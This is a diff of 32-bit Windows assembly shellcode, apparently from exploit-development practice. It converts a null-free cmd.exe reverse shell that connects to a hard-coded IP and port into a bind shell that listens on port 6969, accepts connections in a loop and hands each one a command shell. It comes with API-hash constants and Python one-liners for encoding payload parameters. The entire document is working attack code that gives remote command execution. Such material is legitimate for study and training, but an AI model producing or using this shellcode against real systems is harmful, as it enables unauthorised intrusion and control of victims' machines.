@@ -1,20 +1,15 @@
-; position independent non-NULL cmd.exe reverse shellcode with ExitThread - 279 bytes
+; position independent non-NULL cmd.exe bind shellcode with re-connect - 294 bytes
 BITS 32
 section .text
 global _start
 
 
-_SHIFT equ 0x11    ; programmable hash shift to help account for bad bytes in hashes
-; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-; IP used to receive remove connection (change _IP):
-;   python3 -c "_IP='192.168.119.120';_L=[int(x) for x in _IP.split('.')[::-1]];print(f'0x{_L[0]:02X}{_L[1]:02X}{_L[2]:02X}{_L[3]:02X}')"
-; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-_IP equ 0x9231A8C0 ; 192.168.49.146
+_SHIFT equ 0x11  ; programmable hash shift to help account for bad bytes in hashes
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ; PORT used to receive connection on remote machine (change _P):
 ;   python3 -c "_P=443;print(f'0x{_P&0xFF:02X}{(_P&0xFF00)>>8:02X}')"
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-_PORT equ 0x391B   ; 6969
+_PORT equ 0x391B ; 6969
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ; function hashes used by call_function (_F is function name and _S is the _SHIFT value above):
 ;   python3 -c "_F='LoadLibraryA';_S=0x11;_H=0;[globals().update(_H=((0xFFFFFFFF&((_H>>_S)|(_H<<(32-_S))))+ord(c))) for c in _F];print('0x'+f'{_H:08X}')"
@@ -22,9 +17,10 @@ _PORT equ 0x391B   ; 6969
 _LoadLibraryA   equ 0xC40C8266 
 _WSAStartup     equ 0xAF4D0E14 
 _WSASocketA     equ 0x0F4B85E2 
-_WSAConnect     equ 0x7F436615 
+_bind           equ 0x4043407E 
+_listen         equ 0x90444091 
+_accept         equ 0x70476893 
 _CreateProcessA equ 0x3CAA811E 
-_ExitThread     equ 0x08425506 
 
 
 _start:
@@ -133,75 +129,89 @@ find_kernel32:                     ; loop to find kernel32.dll in the PEB's InIn
   mov  edx, _WSASocketA            ; EDX = hash(WSASocketA)
   call ebp                         ; call WSASocketA & EAX = socket value on return
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-; WSAConnect(socket, (struct sockaddr *), sizeof(struct sockaddr), NULL, NULL, NULL, NULL);
-; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
+; bind(socket, (struct sockaddr *), sizeof(struct sockaddr));
+; https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   push edx                         ; sin_zero[4] to sin_zero[7] = NULL
   push edx                         ; sin_zero[0] to sin_zero[3] = NULL
-  push _IP                         ; sin_addr.s_addr = inet_addr(_IP) 
+  push edx                         ; sin_addr.s_addr = inet_addr("0.0.0.0") 
   push word _PORT                  ; sin_port = htons(_PORT) 
   mov  dl, 0x02                    ; EDX = AF_INET = 0x02
   push word dx                     ; sin_family = AF_INET
-  xor  edx, edx                    ; EDX = NULL
   mov  ecx, esp                    ; ECX = pointer to struct sockaddr on stack
-  push eax                         ; save socket value from WSASocketA on stack before arguments to WSAConnect
-  push edx                         ; push argument #7 (lpGQOS = NULL)
-  push edx                         ; push argument #6 (lpSQOS = NULL)
-  push edx                         ; push argument #5 (lpCalleeData = NULL)
-  push edx                         ; push argument #4 (lpCallerData = NULL)
+  push eax                         ; save socket value from WSASocketA on stack before arguments to bind
   push 0x10                        ; push argument #3 (sizeof(struct sockaddr) = 16)
   push ecx                         ; push argument #2 (struct sockaddr *)
   push eax                         ; push argument #1 (socket from call to WSASocketA above)
-  mov  edx, _WSAConnect            ; EDX = hash(WSAConnect)
-  call ebp                         ; call WSAConnect (EAX = 0 as return value of successful call)
+  mov  edx, _bind                  ; EDX = hash(bind)
+  call ebp                         ; call bind (EAX = 0 as return value of successful call)
+; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+; listen(socket, 0);
+; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen
+; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  pop  ecx                         ; pull saved socket value off stack (Win32 uses stdcall so bind cleaned the stack of its arguments)
+  push ecx                         ; save socket value from WSASocketA on stack before arguments to listen
+  push eax                         ; push argument #2 (means only allow 1 connection max)
+  push ecx                         ; push argument #1 (socket from call to WSASocketA above)
+  mov  edx, _listen                ; EDX = hash(listen)
+  call ebp                         ; call listen (EAX = 0 as return value of successful call)
+; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+; accept(socket, NULL, 0);
+; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept
+; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+accept_loop:
+  pop  ecx                         ; pull saved socket value off stack (Win32 uses stdcall so listen cleaned the stack of its arguments)
+  push ecx                         ; save socket value from WSASocketA on stack before arguments to accept
+  push edx                         ; push argument #3 (sizeof(struct sockaddr) = 0)
+  push edx                         ; push argument #2 (struct sockaddr * = NULL)
+  push ecx                         ; push argument #1 (socket from call to WSASocketA above)
+  mov  edx, _accept                ; EDX = hash(accept)
+  call ebp                         ; call accept (EAX holds the socket of connection upon return)
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ; CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 ; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   xchg edi, esi                    ; EDI = base address of kernel32.dll & ESI = base address of ws2_32.dll
-  pop  ecx                         ; pull saved socket value off stack (Win32 uses stdcall so WSAConnect cleaned the stack of its arguments)
-  push ecx                         ; push STARTUPINFOA.hStdError = socket
-  push ecx                         ; push STARTUPINFOA.hStdOutput = socket
-  push ecx                         ; push STARTUPINFOA.hStdInput = socket
-  push eax                         ; push STARTUPINFOA.lpReserved2 = NULL
-  push eax                         ; push STARTUPINFOA.cbReserved2 = NULL & STARTUPINFOA.wShowWindow = NULL
+  push eax                         ; push STARTUPINFOA.hStdError = socket from accept()
+  push eax                         ; push STARTUPINFOA.hStdOutput = socket from accept()
+  push eax                         ; push STARTUPINFOA.hStdInput = socket from accept()
+  push edx                         ; push STARTUPINFOA.lpReserved2 = NULL
+  push edx                         ; push STARTUPINFOA.cbReserved2 = NULL & STARTUPINFOA.wShowWindow = NULL
   mov  dl, 0xFF                    ; EDX = 0xFF
   inc  edx                         ; EDX = 0x100
   inc  edx                         ; EDX = 0x101 = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW)
   push edx                         ; push STARTUPINFOA.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
+  xor  edx, edx                    ; EDX = NULL
   push 0x0A                        ; stage number of times to loop on stack
   pop  ecx                         ; ECX = 0x0A
 memset:                            ; small loop for a 4 byte memset to 0 on stack
-  push eax                         ; set following to NULL in STARTUPINFOA: dwFillAttribute, dwYCountChars, dwXCountChars, dwYSize, dwXSize, dwY, dwX, lpTitle, lpDesktop, lpReserved
+  push edx                         ; set following to NULL in STARTUPINFOA: dwFillAttribute, dwYCountChars, dwXCountChars, dwYSize, dwXSize, dwY, dwX, lpTitle, lpDesktop, lpReserved
   loop memset                      ; do this 0x0A times 
   mov  cl, 0x44                    ; stage sizeof(STARTUPINFOA)
   push ecx                         ; push STARTUPINFOA.cb = sizeof(STARTUPINFOA)
   mov  ebx, esp                    ; EBX = pointer to STARTUPINFOA on the stack
-  mov  edx, 0xFF9B929C             ; EDX = ~"\x00dmc"
-  not  edx                         ; EDX = "\x00dmc"
-  push edx                         ; push "cmd\x00" string to the stack
-  mov  edx, esp                    ; EDX = pointer to "cmd" string on stack
-  mov  cx, 0x390                   ; ECX = 912 (must be 4 byte aligned to the stack)
-  mov  esi, esp                    ; ESI = ESP
-  sub  esi, ecx                    ; ESI = ESP - 912
-  push esi                         ; push argument #10 (lpProcessInformation = LPPROCESS_INFORMATION)
+  mov  eax, 0xFF9B929C             ; EAX = ~"\x00dmc"
+  not  eax                         ; EAX = "\x00dmc"
+  push eax                         ; push "cmd\x00" string to the stack
+  mov  eax, esp                    ; EAX = pointer to "cmd" string on stack
+  mov  dx, 0x390                   ; EDX = 912 (must be 4 byte aligned to the stack)
+  mov  ecx, esp                    ; ECX = ESP
+  sub  ecx, edx                    ; ECX = ESP - 912
+  xor  edx, edx                    ; EDX = NULL
+  push ecx                         ; push argument #10 (lpProcessInformation = LPPROCESS_INFORMATION)
   push ebx                         ; push argument #9 (lpStartupInfo = LPSTARTUPINFOA)
-  push eax                         ; push argument #8 (lpCurrentDirectory = NULL)
-  push eax                         ; push argument #7 (lpEnvironment = NULL)
-  push eax                         ; push argument #6 (dwCreationFlags = NULL)
-  inc  eax                         ; EAX = 0x01 = TRUE
-  push eax                         ; push argument #5 (bInheritHandles = TRUE)
-  dec  eax                         ; EAX = NULL
-  push eax                         ; push argument #4 (lpThreadAttributes = NULL)
-  push eax                         ; push argument #3 (lpProcessAttributes = NULL)
-  push edx                         ; push argument #2 (lpCommandLine = "cmd")
-  push eax                         ; push argument #1 (lpApplicationName = NULL)
+  push edx                         ; push argument #8 (lpCurrentDirectory = NULL)
+  push edx                         ; push argument #7 (lpEnvironment = NULL)
+  push edx                         ; push argument #6 (dwCreationFlags = NULL)
+  inc  edx                         ; EDX = 0x01 = TRUE
+  push edx                         ; push argument #5 (bInheritHandles = TRUE)
+  dec  edx                         ; EDX = NULL
+  push edx                         ; push argument #4 (lpThreadAttributes = NULL)
+  push edx                         ; push argument #3 (lpProcessAttributes = NULL)
+  push eax                         ; push argument #2 (lpCommandLine = "cmd")
+  push edx                         ; push argument #1 (lpApplicationName = NULL)
   mov  edx, _CreateProcessA        ; EDX = hash(CreateProcessA)
-  call ebp                         ; call CreateProcessA
-; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-; ExitThread(0);
-; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread
-; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-  push edx                         ; push argument #1 (dwExitCode = 0)
-  mov  edx, _ExitThread            ; EDX = hash(ExitThread)
-  call ebp                         ; ESI = address of ExitThread()
+  call ebp                         ; call CreateProcessA (remember caller cleans up arguments on stack in stdcall)
+  xchg edi, esi                    ; ESI = base address of kernel32.dll & EDI = base address of ws2_32.dll
+  add  esp, 0x48                   ; undo stack modifications for CreateProcessA (ESP should point to saved socket from WSASocketA call)
+  jmp  accept_loop                 ; continue accepting connections
